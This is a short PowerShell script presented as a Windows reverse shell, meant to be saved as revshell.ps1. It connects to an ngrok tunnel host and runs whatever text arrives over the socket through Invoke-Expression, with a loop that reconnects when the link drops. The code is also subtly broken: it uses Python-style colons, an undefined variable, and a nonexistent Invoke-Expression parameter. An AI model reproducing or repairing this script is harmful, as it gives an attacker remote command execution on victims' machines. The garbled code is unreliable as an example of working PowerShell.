# Reverse Shell Script (Windows) - Save as revshell.ps1
$client = New-Object System.Net.Sockets.TCPclient("10.tcp.eu.ngrok.io", 29847)
$stream = $client.GetStream()

# Initialize byte array and message buffer
$bytes = 0..65535 | ForEach-Object { 0 }
$msg = ""

# Main receive loop
while (-not ($stream.DataAvailable)):
    Start-Sleep -Milliseconds 100

while ($stream.DataAvailable):
    $stream.Read($bytes, 0, $bytes.Length) | Out-Null
    $msg += [Text.Encoding]::ASCII.GetString($bytes)
    $bytes = 0..65535 | ForEach-Object { 0 }
    $null = $sendbyte.Length
    $stream.Flush()

# Process received commands and send response
Invoke-Expression $msg -CommandProcessor $ProcessCommand
$response = $null

# Example basic command handling
function ProcessCommand { param($cmd) 
    switch($cmd) {
        'dir' { Write-Output ('Directory: ' + (Get-ChildItem).Path) -ForegroundColor Yellow }
        'exit' { exit }
        default { Write-Host $cmd -ForegroundColor White }
    }
}

# Handle exceptions and reconnections
while ($true) {
    try {
        if ($stream.DataAvailable) { continue }
        $response = (Invoke-Expression $msg -CommandProcessor $ProcessCommand)
        $stream.Write([Text.Encoding]::ASCII.GetBytes($response), 0, $response.Length) | Out-Null
    }
    catch { 
        if ($_.Exception.Message -match 'Reconnect') {
            Write-Host 'Connection lost, reattempting in 10s...' -ForegroundColor Red
            Start-Sleep -Seconds 10
            $client = $global:client
        }
        else { throw }
    }
}
